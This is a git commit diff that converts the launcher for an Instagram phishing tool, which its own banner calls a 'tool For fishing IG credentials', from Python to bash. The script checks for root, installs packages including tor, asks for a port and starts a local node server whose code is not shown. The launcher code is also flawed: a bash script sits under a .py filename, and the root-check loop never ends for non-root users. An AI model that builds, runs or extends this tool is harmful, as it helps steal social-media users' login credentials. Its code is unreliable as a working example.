39cc5bf43022dfc3c71f5baa0681dcdc2c3c6e81
Ephraim Sib <97473989+EphraimSib@users.noreply.github.com>
2024-04-15 19:14:38 +0200

    Update IGblueBadge.sh

--- IGblueBadge.py
+++ IGblueBadge.py
@@ -1,120 +1,106 @@
-#bash/bin/python3
+#!/bin/bash
 
+check_root() {
+    [[ $EUID -eq 0 ]]
+}
 
-from selenium import webdriver
-from selenium.webdriver.common.keys import Keys
-from bs4 import BeautifulSoup
-import time
-import requests
-import os 
-import sys
-import re
-
-# This color
-blue='\e[0;34'
-cyan='\e[0;36m'
-green='\e[0;34m'
-okegreen='\033[92m'
-lightgreen='\e[1;32m'
-white='\e[1;37m'
-red='\e[1;31m'
-yellow='\e[1;33m'
-
-def check_root():
-    return os.geteuid() == 0
-
-def main():
-    print("\033[92mCHECKING IF YOU'RE ROOTED...")
-    loading_symbols = ["/", "-", "\\", "|"]
-    i = 0
-    while True:
-        print("\rLoading" + loading_symbols[i % len(loading_symbols)], end="")
-        i += 1
-        time.sleep(10)
-        if check_root():
+main() {
+    echo -e "\033[92mCHECKING IF YOU'RE ROOTED..."
+    loading_symbols=("/" "-" "\\" "|")
+    i=0
+    while true; do
+        echo -ne "\rLoading${loading_symbols[i % ${#loading_symbols[@]}]}"
+        ((i++))
+        sleep 10
+        if check_root; then
             break
+        fi
+    done
 
-    if check_root():
-        print("\033[92mYOU ARE ROOTED.")
-    else:
-        print("\033[92mYOU ARE NOT ROOTED.")
+    if check_root; then
+        echo -e "\033[92mYOU ARE ROOTED."
+    else
+        echo -e "\033[92mYOU ARE NOT ROOTED."
+    fi
+}
 
-if __name__ == "__main__":
-    main()
+main
 
- # Update packages and install dependencies
-    os.system("apt install php")
-    os.system("apt install git")
-    os.system("apt install curl")
-    os.system("apt install python3")
-    os.system("apt install ruby")
-    os.system("apt install tor")
-    os.system("apt install bash")
-    os.system("apt install python3-pip")
-    os.system("apt-get install xidel")
-    os.system("apt-get install python3-selenium")
-    os.system("npm install -g npm")
-    
+# Update packages and install dependencies
+apt install php
+apt install git
+apt install curl
+apt install python3
+apt install ruby
+apt install tor
+apt install bash
+apt install python3-pip
+apt-get install xidel
+apt-get install python3-selenium
+npm install -g npm
 
-    # Display info
-    print("\033[92m\n\n")
-    print("\033[92m ______                          _____        ______              _____        ______       _____                   ")
-    print("\033[92m |     |     |       |     |     |            |     |     /\     |      \     |            |                        ")
-    print("\033[92m |_____/     |       |     |     |____        |_____/    /  \    |       |    | ____       | ____                   ")
-    print("\033[92m |     \     |       |     |     |            |     \   /____\   |       |    |      \     |                        ")
-    print("\033[92m |_____|     |____   |_____|     |_____****** |_____|  /      \  |_____ /     |______|     |_____                   ")
+# Display info
+echo -e "\033[92m\n\n"
+echo -e "\033[92m ______                          _____        ______              _____        ______       _____                   "
+echo -e "\033[92m |     |     |       |     |     |            |     |     /\     |      \     |            |                        "
+echo -e "\033[92m |_____/     |       |     |     |____        |_____/    /  \    |       |    | ____       | ____                   "
+echo -e "\033[92m |     \     |       |     |     |            |     \   /____\   |       |    |      \     |                        "
+echo -e "\033[92m |_____|     |____   |_____|     |_____****** |_____|  /      \  |_____ /     |______|     |_____                   "
 
-    print("\033[92m\n\n")
-    print("\033[92m         ***********************************************")
-    print("\033[92m         #                                             #")
-    print("\033[92m         #   tool For fishing IG credentials #")
-    print("\033[92m         #   Follow Me On Github: @ephraim sib#")
-    print("\033[92m         #   Contact Me In: ephraimsibale20@gmail.com#")
-    print("\033[92m         #   Changelog: 5-12-2023           #")
-    print("\033[92m         #                                             #")
-    print("\033[92m         ***********************************************")
-    print("\033[92m\n\n")
+echo -e "\033[92m\n\n"
+echo -e "\033[92m         ***********************************************"
+echo -e "\033[92m         #                                             #"
+echo -e "\033[92m         #   tool For fishing IG credentials #"
+echo -e "\033[92m         #   Follow Me On Github: @ephraim sib#"
+echo -e "\033[92m         #   Contact Me In: ephraimsibale20@gmail.com#"
+echo -e "\033[92m         #   Changelog: 5-12-2023           #"
+echo -e "\033[92m         #                                             #"
+echo -e "\033[92m         ***********************************************"
+echo -e "\033[92m\n\n"
 
-    # Prompt user to enter a port number
+# Prompt user to enter a port number
+validate_port() {
+    if [[ ! $1 =~ ^([1-9][0-9]{3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$ ]]; then
+        return 1
+    else
+        return 0
+    fi
+}
 
-def validate_port(port):
-    if not re.match('^([1-9][0-9]{3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$', port):
-        return False
-    else:
-        return True
-
-def run_server():
-    while True:
-        port = input("Please enter a port number (1024 to 65535): ")
-        if validate_port(port):
+run_server() {
+    while true; do
+        read -p "Please enter a port number (1024 to 65535): " port
+        if validate_port "$port"; then
             break
-        else:
-            print("Invalid port number. Please enter a valid port number.")
+        else
+            echo "Invalid port number. Please enter a valid port number."
+        fi
+    done
 
     # Generate the link
-    link = f"http://localhost:{port}/"
+    link="http://localhost:$port/"
 
     # Print the link
-    print(f"Generated link: {link}")
+    echo "Generated link: $link"
 
     # Set the file to write log messages to
-    logfile = "server.log"
+    logfile="server.log"
 
     # Set the file to run the server
-    server_file = "server.js"
+    server_file="server.js"
 
     # Set the command to run the server
-    server_command = f"node {server_file}"
+    server_command="node $server_file"
 
     # Print start message
-    print(f"Starting server on port {port}")
+    echo "Starting server on port $port"
 
     # Redirect stdout and stderr to log file
-    sys.stdout = open(logfile, "a")
-    sys.stderr = open(logfile, "a")
+    exec &>> "$logfile"
 
     # Run the server
-    os.system(f"{server_command} {port}")
+    $server_command "$port"
+}
 
-if __name__ == "__main__":
-    run_server()
+run_server
+
